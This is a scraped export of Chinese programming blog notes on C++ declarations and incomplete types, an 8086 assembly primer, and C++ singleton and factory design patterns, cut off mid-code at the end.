不完整类型不多，但是我们却经常会遇到：\nvoid类型（包括CV限定的void）\n没有完全定义的对象类型：\n声明但是没有定义的类类型，比如前向声明的类类型。\n未知边界的数组，比如：int array[]; 。\n不完整类型为元素类型数组。\n从声明点开始到确认基础类型点为止之间的枚举类型，比如：\n1 2 3 4 5 6 enum Color { RED, // 不完整类型 BLUE, // 不完整类型 BLACK = 3 } 要求必须完整类型的上下文 C++程序需要避免使用不完整类型，以下场景要求使用的类型（这里假设T）必需是完整的：\n定义或调用返回值或参数为 T 的函数。 定义 T 类型的对象。 声明类型为 T 的非静态数据成员。 new 语句分配类型为 T 的对象或者元素类型为 T 的数组。 类型 T 从左值到右值的转换。 隐式或显示转换到 T 类型。 标准转换、dynamic_cast、static_cast 转换到 T* 或 T\u0026 （除非从空指针或有有CV限定的void指针类型转换）。 T 类型用于类成员访问符语句。 T 用于 typeid 、sizeof 、alignof 语句。 作用于 T* 的算数运算符。 T 作为基类类型和左值类型。 T 、T* 、T\u0026 用于 catch 子句。 即：如果在需要知道T的内存大小和布局的时候，则 T 类型必须在同一翻译单元内有定义，其他情况不是必需的。\n以下情况是可以的，也是我们大多数时候都可以实现的：\n类类型在翻译单元某一点是不完整的（比如前向声明？），但在后来某一点被视为完整类型，则该类类型在两点处具有相同类型。 翻译单元某一点处数组元素类型为不完整类型，当后面数组元素类型变为完整，则数组类型变为完整，且两点处数组类型相同。 数组对象声明类型如果为未知边界的数组，即使之后边界已知，两点处数组类型也不同。 对未知边界数组的引用或永久指向指针、引用不完整类型、typedef 命名前面的不完整类型，无论什么情况，都无法让数组类型完整。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 struct X; // 声明X，未定义 extern X* px; // px指向不完整类型 extern int arry[]; // 不完整类型，位置边界数组 typedef int Arry[]; // 不完整类型 Arry* pary; // 指向不完整类型的指针 Arry** ppary; // 指向指针的指针，正确 void test1() { pary++; // 错误，pary指向不完整类型，无法计算内存大小。 ppary++; // 正确，指针大小已知，64位下8字节。 } int arry[10]; void test2() { pary = \u0026arry; // 错误，这里的arry跟之前extern arry[] 类型不同，即使arry已经完整。 pary++; // 错误 } void test3() { px++; // 对不完整类型指针进行算数运算，有问题 // 报错：error: cannot increment a pointer to incomplete type 'X' } struct X{ int x; }; X x; void test4() { px = \u0026x; // x已定义且为完整类型，px可用 px++; // 正确 } 一个定义规则 在任何一个翻译单元中，只允许定义相同变量、函数、类类型、约束、模板、枚举类型一次，可以多次定义，但是不能多次声明。 而程序出现重定义错误就是因为在同一翻译单元中有多个相同声明。\n总结 声明很好理解，并不是需要初始化了的才算定义，所有定义都是声明，但是几种特殊情况除外，记住这几种特殊情况，再问声明与定义就不难了。\n在使用时，如果遇到需要知道类型内存大小和布局的上下文，则该类型必须在翻译单元内有定义，否则程序有问题，其他情况可以不对其定义。\n程序中尽量不要使用未知边界的数组以及对其的引用或指针，一经声明，即使后面类型变为完整，两处类型也不相同。\n程序出现重定义行为，首先转到重定义符号处，查看该符号所有相同声明，再排除声明不是定义的情况，基本能排查出重定义原因，现代IDE基本能在编译前指出重定义错误。\n","description":"声明与定义，傻傻分不清？看看标准文档怎么说","tags":["Code","C++基础"],"title":"C++声明与定义","uri":"/posts/id/3241111/"},{"categories":["posts"],"content":" 阅读须知：本文转载自 8086 及其汇编汇编 8086不搞数学的汤老师的博客 ！\n汇编不是一个语言，而是一群语言（不同架构不一样，相同架构不同版本不一样，相同架构相同版本可能还有不同的格式，如 x86 就有 ATT 和 intel 两种格式）。学汇编前现需要明白自己的学的汇编版本。本篇讲述的是 86/88 16 位的 intel 格式的汇编 ，而 386 及其以后是 32 位乃至更高。\n基础知识 汇编语言组成 机器码：一串二进制数，由 CPU 执行。\n汇编指令：由对应机器码的指令，要通过编译器编译为机器码才能够运行。\n伪指令：对汇编过程进行控制的指令，不能被运行，需要翻译成汇编指令。\n指令和数据 在内存或磁盘上，指令和数据没有区别，都是一串二进制数据。CPU 工作时，将有的信息看作指令，有的看做数据。8086 内部分为两个部分，总线接口单元 BIU 和 执行单元 EU ：\nBIU：负责与存储器和 I/O 接口传送信息（读写数据）。 EU：负责所有指令执行，也负责计算内存地址（执行指令）。 EU 和 BIU 能够独立工作，两者并行工作减少 CPU 取指而等待的时间，从而提高 CPU 利用率。\n8086 的指令队列有 6 个字节，当指令队列出现 2 个空字节 BIU 就自动执行一次取指令周期，将下一条要执行的指令从内存单元读入指令队列。并采用先进先出原则，按顺序存放，并按顺序取到 EU 中去执行。从而提高取指与其他操作的并行度\nCPU 对存储器的读写 存储器被划分成多个单元，存储单元从 0 开始编号，即 地址。\nCPU 要想进行数据读写就必须进行 3 类信息交互：\n存储单元的地址（地址信息） 是读是写，还是其他（控制信息） 读/写的数据（数据信息） CPU 如何将上诉三类信息传入存储器呢？是总线，其按照逻辑则分为：地址总线、控制总线、数据总线。即通过地址总线获取要访问的存储单元地址，控制总线获取是读还是写操作，数据总线则用以存放读/写数据。\n总线 地址总线：用以制定存储器单元地址，其宽度（根数）决定寻址能力。\n数据总线：数据传送通过数据总线，其宽度决定一次传输数据的位数。\n控制总线：通过控制总线传输控制信息，其宽度决定有多少种控制。\n地址总线一共 10 根，意味着最大寻址是 $2^{10}$ 次方，从 0 到 $2^{10} - 1$ 。\n数据总线一共 8 根，意味着一次最多传输 8 bit 的数据。\n控制总线一共 2 根，意味这也就只有 2 种控制。\n寄存器基本介绍 寄存器可以理解为 CPU 内部的存储器。对所有的数据操作，都必须读入寄存器才能交由 CPU 操作。8086 所有寄存器都是 16 bit。\n通用寄存器：常用放一般数据，可拆分为高低 8 位寄存器，如：AX，BX，CX，DX。\n1 2 3 mov AX, 1234H ; 写AX，AH=12H，AL=34H mov AL, 12H ; 写AL，AX=1212H mov BX, AX ; 写BX，BX=1212H 段寄存器：存放段地址信息，如：CS（代码段）、DS（数据段）、SS（堆栈段）、ES（附加段）。\n指令指针寄存器： IP。\n变址寄存器：DI（目的变址）、SI（源变址）。\n指针寄存器：SP（堆栈指针）、BP（基址指针）。\n标志寄存器： FLAGS。\n16 位结构的 CPU 所谓 16 位结构的 CPU，即：\n运算器最多处理 16 bit 数据。 寄存器最大 16 bit 。 寄存器和运算器的通路为 16 bit 。 8086 数据类型 字节：byte，大小 8 bit，可存在 8 位寄存器。 字：word，大小 16 bit，有高低两个字节组成，存在 16 位寄存器上。 8086 采用小端存储，即字数据的高 8 位存储在高 8 位寄存器，低 8 位存储在低 8 位寄存器（最低有效为在前）。如：0x01234567 在 0x100 位置存储：\n1 2 0x100 0x101 0x102 0x103 67 45 23 01 字数据大小由字长决定，所谓字长即一次能处理的最大位数长度。\n物理地址 8086 有 20 位地址总线，但是只有 16 位结构的 CPU。所以需要一种将 16 的地址映射为 20 位地址的方案。\nCPU 提供 2 个地址，一个称为段地址，另一个称为偏移地址，通过地址加法器，映射为物理地址：物理地址 = 段地址 * 16 + 偏移地址 *。\n内存没有分段，段的划分来自 CPU。\n不同的段地址和偏移地址可以组成相同的物理地址。\n寄存器 MOV 指令 格式如：指令 目标操作数, 源操作：\n1 2 3 4 5 6 ; MOV 将数据存放到一个寄存器/内存单元中 mov AX, 8\t; 立即数到寄存器 mov AX, AX ; 寄存器到寄存器 mov AX, [0] ; 存储单元到寄存器 mov [0], AX ; 寄存器到存储单元 mov DS, AX ; 寄存器到段寄存器 CS 和 IP CS 是代码段寄存器，IP 是指令指针寄存器。IP 存放的是在代码段中的偏移的地址。任意时刻 CS:IP 指向的物理地址中的数据，都将解释为当前执行的指令。读取一条指令后，IP 寄存器中的值会自动增加，增加多少取决于该指令占了多少字节。\n1 2 3 ; 通过修改CS和IP所存储的数据，就可以改变要执行的指令 jmp 1234H:4321H ; CS=1234H，IP=4321H jmp AX ; 相当于 MOV IP, AX DS 和数据段 数据段中的所有二进制位都将解析为普通的数据。物理地址是通过段地址和偏移地址构成，但是你发现使用 mov 指令只需要指定偏移地址，段地址却没有指定。是因为存储器寻址默认的段地址为数据段地址，也就是 DS 寄存器所存储的地址。\n1 2 3 mov AX, [1234H] ; 默认为DS段 mov AX, es[1234H] ; 段重设为ES段 mov DS, 4321H ; 同样也可修改DS中所存储的地址 CPU 的栈机制 栈 是一种后进先出的数据结构：\n1 2 3 4 mov AX, 1234H ; PUSH和POP操作数，可以是寄存器、内存单元、段寄存器 push AX ; 将AX存放的1234H，压入栈 pop BX ; 将栈顶元素弹出，放入BX 这里同样的没有指定段地址，是因为对栈操作的段地址是 SS 堆栈段寄存器所存储的值。为了标识栈顶元素，所以还会有一个 SP 栈顶指针寄存器指向栈顶元素的偏移地址，SS:SP 指向栈顶元素。因为栈的进出方式，所以 push 和 pop 操作本质是在改变 SP 中所存储的偏移地址。\n栈顶超界问题：因为只有 SS 和 SP 两个寄存器，无法标志栈从哪开始到哪结束，所以一味着 push 和 pop 会出现问题。\n8086 的寻址 立即数寻址 1 2 3 ; 立即数可以是数值、字符、符号、数值表达式 mov al, 8 ; MOV指令取多长与第一个操作数的寄存器有关 mov AX, 1234 寄存器寻址 1 2 3 ; 从一个寄存器到另一个寄存器 mov AL, CL mov DS, AX ; 段寄存器必须通过寄存器寻址 存储器寻址 1 2 3 4 5 6 7 8 9 10 11 12 13 ; 直接寻址，[]内是立即数 mov AX, [1234H] ; 默认为DS段 mov AX, ES[1234H] ; 段重设为ES段 ; 寄存器间接寻址，[]内是寄存器 mov AX, [BX] ; 基址寻址，基址寄存器BX、BP，加上偏移量 mov BL, 10H[BP] mov BL, [BP+10H] mov BL, [BP]10H ; 以上三种一样 ; 变址寻址，变址寄存器SI、DI，加上偏移量 mov AX, 10H[SI] ; 基址变址寻址，变址寄存器+基址寄存器+偏移量 mov AX, [BX][SI][10] 转移操作寻址 当程序发生转移时：\n需要给出即将转移去执行的指令的有效地址，替代 IP 寄存器的值。 如果代码段不一样，还需要将 CS 换为新代码段的基址。 操作数作为转移地址使用，称为 转移操作寻址。\n1 2 3 ; 通过修改CS和IP所存储的数据，就可以改变要执行的指令 jmp 1234H:4321H ; CS=1234H，IP=4321H，修改CS段间转移 jmp AX ; 相当于 MOV IP, AX，不修改CS称为段内转移 常见汇编指令 add、sub 1 2 3 4 ; ADD、SUB操作数类型同MOV mov AX, 1 add AX, 2 ; AX=1+2=3 sub AX, 1 ; AX=3-1=2 div 1 2 mov AX, 5 div AX, 2 ; AH=1，AL=2，AX=00010010B 除数为 8 位，则被除数为 16 位。\n除数为 16 位，则被除数为 32 位，其中高 16 位在 dx，低 16 在 ax（目标操作数的寄存器）。\n结果为 8 位，则高 8 位为余数，低 8 位为商。\n结果为 16 位，则 dx 为余数，ax 为 商。\nmul 1 2 3 mov AX, 2 mov DX, 3 mul DX ; ax=dx*ax=2*3=6 两个数相乘只能是 8 位和 8 位乘或 16 位和 16 位乘。\n若 8 位乘，则用 al 和寄存器乘。\n若 16 位乘，则用 ax 和寄存器乘。\n结果 8 位默认放在 ax。\n结果 16 位，则低位在 ax，高位在 dx。\nand 、or 1 2 3 4 ; and按位与，or按位或 mov AL, 01100011B and AL, 00111011B ; AL=00100011B or AL, 01110110B ; AL=00110010B 关于 ASCII 码 ：汇编中用单引号引住的字符，会将里面的所有字符变为 ASCII 码存储。\n大写 二进制 小写 二进制 A 0100 0001 a 0110 0001 B 0100 0010 b 0110 0010 … … … … 观察上表发现，大写与小写字母的二进制，只是在第 6 位不同。即将第 3 位数为 0 则是大写，1 则是小写：\n1 2 3 4 ; 大小写转换 mov AX, 'A' or AX, 00100000B ; 转为小写a and AX, 00000000B ; 转为大写A 数组操作 利用基址寻址和变址寻址，达到数组的操作。\n1 2 3 4 mov DS , BX mov BX[0], 1 ; 2000H:0 的位置存了1 mov BX[1], 2 ; 2000H:1 的位置存了2' mov BX[2], 3 ; 2000H:2 的位置存了3 in 、out I/O 端口 ：\nI/O 端口：CPU 要和 I/O 设备数据传送，在接口中必须设置特定寄存器（一个或多个）供给 CPU 直接存取访问 I/O 端口地址译码：分为两部分： 高位：译码形成片选信号，用于选择接口。 低位：端口号，用于选择一个接口里的端口。 一个接口可以拥有多个端口： 命令端口 数据端口 状态端口 访问端口本质是访问寄存器 I/O 端口编址方式 ：\n统一编址（存储器映像编址） 把每一个端口视为一个存储器单元 对 I/O 接口操作与对存储器的操作完全相同，但是指令较长，执行速度慢 外设数目只受总存储容量限制，占用存储器的一部分地址空间 读写控制简单 识别 I/O 端口，必须对全部地址线译码，增加复杂性，寻址时间长 独立编址 I/O 端口单独编制，不和存储空间混在一起，不占用存储器地址空间 I/O 端口必须采用专用 I/O 指令 I/O 端口地址译码简单，寻址快 指令少，灵活性差 增加引脚 8086 采用非统一编制，意味着读写端口需要使用特殊的指令：\n1 2 3 ; 只能使用 AX 或 AL 存放从端口读入或向端口写入的数据 in AL, 60H ; 从 60H 端口读入一个字节到 AL 寄存器 out 60H, AL ; AL 寄存器的数据输出到 60H 端口 IO 端口寻址 1 2 3 4 5 6 ; 端口直接寻址 in AL, 20H\t; IN、OUT不能读写到H out 60H, AX ; 端口间接寻址 mov DX, 20H in AL, DX\t; 从20H端口读 转移指令 段内转移 ：只修改 IP。修改范围为 -128 ~ 127 为短转移，修改范围为 -32768-32767 为近转移。\n段间转移 ：修改 CS 和 IP。\n转移指令有无条件转移、条件转移、循环指令、过程和中断。\nloop loop 循环指令，属于短转移。CPU 执行 loop 指令，进行以下两步操作：\nCX 寄存器中存储的值 -1 。 CX 中的值不为零则继续。 1 2 3 4 5 ; 计算2^3 mov CX, 3 mov AX, 2 S: add AX, AX loop S 标号：S: 标记一条指令，当执行 loop S 满足条件时会跳到标记的指令。ofset 操作符：可以取得标号偏移地址。\njcxz 、jmp jcxz ：条件转移指令，属于短转移。在转移前，会先判断 CX 寄存器是否为 0，只有为 0 时才会转移。\njmp ：无条件转移指令，直接就跳转。\nret 、retf ret 指令：弹出栈顶元素给 IP 寄存器。\nretf 指令：弹出栈顶元素给 IP 寄存器，再弹出栈顶元素给 CS 寄存器。\n1 2 ret ; pop IP retf ; 先pop IP，再pop CS call 1 2 3 4 call S ; 等价于以下 push IP jmp S 标志寄存器 标志寄存器介绍 作用：\n存储相关指令的结果 CPU 执行指令提供依据 控制 CPU 工作方式 ZF：0 标志位，为 1 时说明结果是 0 。\nPF：奇偶标志位，“1”的个数为偶数，置 1，否则置 0 。\nSF：符号标志位，为 1 为负数。\nCF：进位/借位标志位，只有当无符号计算时有效。\nOF：溢出标志位，只有当有符号计算时有效。\nAF：辅助进位标志位，BCD 码的进位。\nDF：方向标志位，决定串操作指令执行时有关指针寄存器调整方向，为 1 时递减。\nTF：跟踪标志位，为 1 时进入单步跟踪，每执行一条指令就会产生一个中断。\nIF：中断标志位，为 1 时响应可屏蔽中断。\nadc 和 sbb adc 是带进位的加法，sbb 是带借位的减法。其作用就是可以将超 16 位的数据进行相加减。\n1 2 3 4 5 6 7 8 9 10 11 ; 俩32位数据相加，如计算1EF000H+201000H mov AX, 001EH ; 高4位 mov BX, 0F00H ; 低4位 add BX, 1000H ; 低4位相加，产生进位信息给CF adc AX, 0020H ; 高4位相加，再加进位信息CF ; 俩32位数据相减，如计算3E1000H-202000H mov AX, 003EH mov BX, 1000H sub BX, 2000H sbb AX, 0020H cmp cmp 是比较指令，其原理是使用减法指令，但是不会存储结果，只会影响标志位信息。通过读取标志位信息就可以得到俩操作数大小比较结果。\n1 2 3 4 5 mov AX, 1 mov BX, 2 cmp AX, BX ; 1-2，产生借位，则CF=1 cmp BX, AX ; 2-1=1，则CF=0，ZF=0 cmp AX, AX ; 1-1=0，则ZF=1 检测标志位的条件转移 指令 跳转条件 检测标志位 je 等于 ZF=1 jne 不等于 ZF=0 jb 小于 CF=1 jnb 不小于 CF=0 ja 大于 CF=0 且 ZF=1 jna 不大于 CF=1 或 ZF=1 pushf 和 popf pushf 将标志寄存器的值压入栈。popf 将栈中元素弹出到标志寄存器。\nshl 和 shr shl 是逻辑左移指令，shr 是逻辑右移指令。逻辑左移和逻辑右移动会将缺失补 0 ，并且会将移出的最后一位写入 FLAGS 中的 CF 标志位。\n1 2 3 mov AL, 10011000B shl AL, 1 ; 逻辑左移4位，AL=00110000B，CF=1 shr AL, 1 ; 逻辑右移4位，AL=00011000B，CF=0 还有 sal、sar（算术左移、算术右移） 和 rol、ror（循环左移、循环右移）。\n中断 内中断 CPU 内部发生除法错误，单步执行，执行 into 指令和 int 指令时，则会产生内中断。CPU 用中断类型码标识中断信息的来源。中断类型码 8 bit，可表示 256 种中断源。\n执行 int N 意味着触发 N 号中断的中断过程，即通过该指令可以调用任意的中断处理程序。 执行 into ，检测 OF 位是否位 1（是否溢出），当溢出时发生中断。\n外中断 当 CPU 外部需要处理的事情发生时，就会产生外中断。如：外设的数据到达。\n从 INTR 引脚接入，可屏蔽中断：CPU 可以不响应的外中断。当从标志寄存器的 IF 为 1 时，CPU 才会响应。\n从 NMI 引脚接入，不可屏蔽中断：CPU 必须响应的外中断。执行完当前指令后，立即响应。中断类型码固定为 2，所以不需要从中断信息中获取中断类型码。\n外中断的过程和内中断几乎是一样的，只是内中断是 CPU 产生的，而外中断是通过数据总线传入 CPU 的。\n关于中断、异常的分类：\n国内教材：把中断分为外部中断和内部中断。一般把外部中断叫做中断。内部中断叫做异常，异常又分为陷阱、故障、终止。\n国外教材（csapp）：把异常分为同步异常和异步异常。同步异常包含陷阱、故障、终止。异步异常则为中断。\n以上两者的共同点是，异常是同步事件，中断则是异步事件。抓住这点，即使是不同教材，也能区分。\n中断向量表 中断向量：存放中断处理程序的入口地址。通过更改入口地址，就能当发生中断时执行自定义的程序\n中断向量表：由中断向量组成，这张表是一个连续的内存空间\n用中断类型码，取得中断向量，从而得到中断处理程序的入口地址。对于 8086 来说，中断向量表存放在内存地址 0 处，一共 256 个中断向量，每个中断向量 4 个字节。即中断向量表范围为 0000H～03FFH 。\n中断过程和恢复现场 中断的过程：\n从中断信息中获取中断类型码（不可屏蔽中断不需要）。 FLAGS 中的数据入栈。中断要改变标志寄存器，所以先存入栈。 TF、IF 置 0（可屏蔽中断不需要）。 CS、IP 中的数据依次入栈。 通过中断类型码获取中断程序入口地址。 根据入口地址设置 CS、IP 。 中断程序处理的最后，执行 iret 指令恢复现场，程序继续往下执行。因为栈中保留了中断前的数据，只需要从栈中弹出 IP、CS、FLAGS 的数据即可。\n参考资料 王爽：《汇编语言(第 3 版)》 ","description":"","tags":["笔记","汇编"],"title":"8086汇编快速入门笔记","uri":"/posts/id/382040/"},{"categories":["posts"],"content":"单例模式 ，顾名思义就是一个程序中只有一个实例，并提供一个可以访问的全局接口，可以分为以下几种不同的实现方式。\n使用时初始化（懒汉式） 使用指针指向全局对象，使用到的时候再进行初始化：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 #include \u003catomic\u003e #include \u003cmemory\u003e // 单例模式测试类 class Application { public: // 返回全局实例 static Application* getInstance() { if (Application::g_instance == nullptr) { std::lock_guard\u003cstd::mutex\u003e lock{Application::g_mux}; // 获得锁后再进行一次判断 if (Application::g_instance == nullptr) { // 使用atomic,保证初始化为原子操作 Application::g_instance = new Application; } } return Application:g_instance; } // 全局静态指针在程序结束时不会释放其指向的对象内存 // 这里定义一个嵌套类，病定义该类的静态变量，在这个嵌套类 // 析构时释放全局指针指向的内存 class Del { public: ~Del() { delete Application::g_instance; } }; public: Application(const Application\u0026) = delete; Application(Application\u0026\u0026) noexcept = delete; Application\u0026 operator = (Application\u0026\u0026) noexcept = delete; Application\u0026 operator = (const Application\u0026) = delete; private: // 这些函数设置为私有是防止用户手动进行构造， // 违背了程序只有一个实例的原则 Application() = default; ~Application() = default; private: // 指向全局唯一实例的指针，使用atomic保证初始化是原子的 static std::atomic\u003cApplication*\u003e g_instance; // 互斥锁 static std::mutex g_mux; // 用于释放全局实例指针的静态对象 static Del g_del; }; // 类静态变量需要类外初始化 std::atomic\u003cApplication*\u003e Application::g_instance = { nullptr }; std::mutex Application::g_mux{}; Application::Del g_del{}; 对象的初始化分为多个步骤，为了保证初始化过程的线程安全，这里使用了 atomic ，同时双判断保证了只有全局实例没有初始化才对其初始化。\n程序结束时会自动回收 g_instance、g_mux、g_del 的内存，但是不会释放 g_instance 指向的内存，所以使用 g_del 的析构函数来释放 g_instance 指向的内存，虽然现在操作系统都会智能的在程序结束时释放分配的内存，但是我们最好还是遵循规范，程序分配的程序给释放掉。\n上面使用了指针加同步方式来初始化全局变量，但是还有一个更优雅的方法，C++11 后语言规范规定了局部静态变量从初始化到初始化完成这段时间，其他变量访问到这个局部变量时会等待，也就保证了线程安全，不需要我们进行保证，更加方便。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 单例模式测试类 class Application { public: static Application* getInstance() { // C++11+保证初始化线程安全 static Application g_application; return \u0026g_application; } public: Application(const Application\u0026) = delete; Application(Application\u0026\u0026) noexcept = delete; Application\u0026 operator = (Application\u0026\u0026) noexcept = delete; Application\u0026 operator = (const Application\u0026) = delete; private: // 这些函数设置为私有是防止用户手动进行构造， // 违背了程序只有一个实例的原则 Application() = default; ~Application() = default; }; 提前初始化（饿汉式） 饿汉式单例模式也是使用全局静态变量保证实例单一，而全局静态变量初始化时机在 main 函数前，自然不存在多线程竞态。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // 单例模式测试类 class Application { public: static Application* getInstance() { return \u0026Application::g_application; } public: Application(const Application\u0026) = delete; Application(Application\u0026\u0026) noexcept = delete; Application\u0026 operator = (Application\u0026\u0026) noexcept = delete; Application\u0026 operator = (const Application\u0026) = delete; private: // 这些函数设置为私有是防止用户手动进行构造， // 违背了程序只有一个实例的原则 Application() = default; ~Application() = default; private: static Application g_application; }; // 全局变量初始化（在main函数执行前） Application Application::g_application {}; 总结 只有在程序只需要一个实例是才需要使用单例模式，在使用单例模式是需要注意程序只有一个实例的原则，这就需要：\n保证用户不能自己构造实例，将构造函数设为 private 可以禁止用户构造。 如果使用懒汉式，需要注意多线程下的竞态问题，确保只有一个实例被初始化，指针式的需要使用锁和原子变量保证多线程安全，而从C++11开始就可以使用局部静态变量的方式，语言规范保证了全局实例初始化时的线程安全，使用指针式时为了规范，避免内存泄漏，还需要在类中定义一个嵌套类和这个类的静态变量，静态变量在程序结束时被回收，调用其析构函数，然后在嵌套类对象析构函数中对全局指针指向的对象进行内存释放，避免内存泄漏。 饿汉式单例模式实现简单，不过对于C++单元编译，不同单元的初始化顺序可能不同，可能存在获取实例的函数在静态变量初始化之前被调用，返回一个未初始化的变量的情况。 参考链接：知乎 | C++单例模式\n","description":"","tags":["笔记","设计模式"],"title":"C++设计模式笔记，单例模式","uri":"/posts/id/381659/"},{"categories":["posts"],"content":"工厂模式主要是将具有继承关系的类，通过一个统一的工厂类创建对应的类对象，项目较复杂时可以方便的创建子类对象。\n本文利用原神中不同角色来讲讲工厂模式，原神中有很多角色，不同角色对应有不同的元素属性，但是不同角色之间也有很多共同的属性，比如血量、攻击力、防御力、暴击率等，可以将这些共同特征抽象成一个角色类，然后其他类继承自这个类，然后通过一个工厂类来统一构造对象。\n根据工厂构造的不同可以将工厂模式分为以下几种：\n简单工厂模式 在简单工厂模式中，有一个工厂类，是工厂模式中的核心，定义了产生不同角色对象的接口和函数；有一个抽象产品类，这里可以是对角色的抽象，有很多具体的产品类 ，继承自抽象产品类，这里对应不同角色的类。示意图如下：\nC++实现的角色抽象类和具体子类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u003ciostream\u003e // 表示不同角色的枚举 enum class RoleEnum { // 旅行者 TravelerRole, // 雷电将军 GeneralThunderboltRole }; // 角色的抽象类 class AbstractRole { public: // .... virtual void show() = 0; virtual ~AbstractRole()= default; private: // 角色属性 ... }; // 旅行者，继承自抽象基类 class TravelerRole : public AbstractRole { // ... public: void show() override { std::cout \u003c\u003c \"我是旅行者！\\n\"; } }; // 雷电将军，继承自抽象基类 class GeneralThunderboltRole : public AbstractRole { // ... public: void show() override { std::cout \u003c\u003c \"我是雷电将军！\\n\"; } }; C++实现的角色工厂类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 生产角色的工厂类 class RoleFactory { public: // 创建角色，根据传入的类型构造对象 AbstractRole* createRole(enum RoleEnum role_type) { switch (role_type) { case RoleEnum::TravelerRole: return new TravelerRole(); case RoleEnum::GeneralThunderboltRole: return new GeneralThunderboltRole(); default: break; } } private: // ... }; 运行代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 void test_simple_factory() { RoleFactory factory; // new 一个旅行者 AbstractRole* role1 = factory.createRole(RoleEnum::TravelerRole); role1-\u003eshow(); delete role1; // new 一个雷电将军 AbstractRole* role2 = factory.createRole(RoleEnum::GeneralThunderboltRole); role2-\u003eshow(); delete role2; } 这种简单工厂模式最大的缺点就是如果要新增一个角色，就需要修改工厂类和枚举，非常麻烦而且违背开闭原则 。\n工厂方法模式 为了不修改工厂类，我们可以将工厂类抽象出来，再利用C++多态，派生出多个实际工厂类，每个工厂类只负责生产一类角色，这就引申出了工厂方法模式，示意图如下：\n需要改动一下工厂类部分\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // 生产角色的工厂抽象类 class AbstractRoleFactory { public: virtual ~AbstractRoleFactory() = default; public: // 创建角色，根据传入的类型构造对象 virtual AbstractRole* createRole() = 0; private: // ... }; // 具体的工厂类，生产旅行者 class TravelerRoleFactor : public AbstractRoleFactory { public: AbstractRole * createRole() override { return new TravelerRole(); } }; // 具体的工厂类，生产雷电将军 class GeneralThunderboltRoleFactory : public AbstractRoleFactory { public: AbstractRole * createRole() override { return new GeneralThunderboltRole(); } }; 角色的枚举以及不需要了，测试代码也需要进行修改，因为现在角色由特定的角色工厂生产\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 void test_simple_factory() { // 生产旅行者的工厂 TravelerRoleFactor factory; AbstractRole* role1 = factory.createRole(); role1-\u003eshow(); delete role1; // 生产雷电将军的工厂 GeneralThunderboltRoleFactory factory1; AbstractRole* role2 = factory1.createRole(); role2-\u003eshow(); delete role2; } 这种类型的工厂缺点也很明显了，一个工厂只能创建一种角色，每新增一个角色，都需要写一个角色工厂类，增加了代码量，不过好在不需要修改工厂类了。\n抽象工厂模式 原神中不止有角色，还有怪物，如果还需要创建怪物角色，就需要对工厂进行扩充，可以增加一个方法用于创建怪物，同时对怪物也像角色那样进行抽象，具体怪物继承自怪物抽象类。示意图如下：\n模板方法工厂 如果能将前面的两种不同模式结合起来就好了，即既不用修改工厂类，也不用增加一个类就写一个工厂类，其实利用C++的模板就可以实现了，让模板帮我门写角色工厂类，也就是最后要说的模板方法工厂。示意图如下：\n首先我们定义一个模板抽象工厂类，模板参数为 P\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 定义抽象模板工厂类 template\u003ctypename P\u003e class AbstractFactory { public: // 模板 P 的指针 using pointer_type = P *; public: virtual ~AbstractFactory() = default; // 这里 P 应该传入一个抽象基类，返回这个指针， // 但是实际返回的对象由模板工厂子类决定。 virtual pointer_type create() = 0; }; 接下来定义一个模板工厂的子类，这个类有两个模板参数，一个是产品基类 T ，一个是实际产品类 CP ，并使用 is_base_of_v 限制两个模板参数，必须为继承关系\n1 2 3 4 5 6 7 8 9 10 // 定义实际角色的模板工厂类 // is_base_of_v\u003cP, CP\u003e 判断 CP是否继承自P template\u003ctypename P, typename CP\u003e requires std::is_base_of_v\u003cP, CP\u003e class ConcreteFactory : public AbstractFactory\u003cP\u003e { public: AbstractFactory\u003cP\u003e::pointer_type create() override { return new CP(); } }; 之后只需要定义角色或者怪物，然后直接使用 ConcreteFactory 就可以产生对象，不需要我们修改基类，也不需要我们添加新的工厂类，因为这工作已经被模板解决了。\n使用起来就很棒了:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void test_simple_factory() { ConcreteFactory\u003cAbstractRole, TravelerRole\u003e factory; AbstractRole* role1 = factory.create(); role1-\u003eshow(); delete role1; ConcreteFactory\u003cAbstractMonster, AbyssalMageMonster\u003e factory1; AbstractMonster* role2 = factory1.create(); role2-\u003eshow(); delete role2; // 不行，会报错！因为深渊法师不是继承自角色抽象基类 // ConcreteFactory\u003cAbstractRole, AbyssalMageMonster\u003e factory3; } 原本想用可变参数模板作为模板工厂类 create 函数的参数，但是想到可变参数无法用作虚函数，就放弃了这个想法（如果虚函数支持可变参数，调用参数时就不知道实际传递了多少个参数，也无法知道每个参数的类型和大小，从而无法从虚函数表中找到相应函数并调用），所以这个工厂模式的缺陷就是产品的构造函数需要确定，灵活性相对降低。\n注册式的工厂模式 上面的模板方法工厂以及很优雅了，不过可以看到，如果要生成不同类型的角色，就需要声明一个新的工厂类对象，如果可以随时随地调用就好了，这就需要使用到注册式的了。\n注册模板工厂利用一个全局的 map 存放角色名-\u003e具体角色类型的映射，使用时通过传递角色名，然后工程根据 map 查找到具体的产品类型并构造返回。\n要保证 map 全局变量的唯一，就需要使用单例模式，使用时通过这个单例来构造对象，不过首先需要定义一个函数对象，用于构造对象，定义 string-\u003e函数对象 映射的 map\n1 2 3 4 5 6 7 8 9 10 11 12 13 // 定义工厂类的单例模式 template\u003ctypename P\u003e class Factory { public: // 获取全局实例 static Factory\u003cP\u003e\u0026 Instance() { static Factory\u003cP\u003e g_factory; return g_factory; } private: std::unordered_map\u003cstd::string, std::function\u003cP*()\u003e\u003e _map; }; 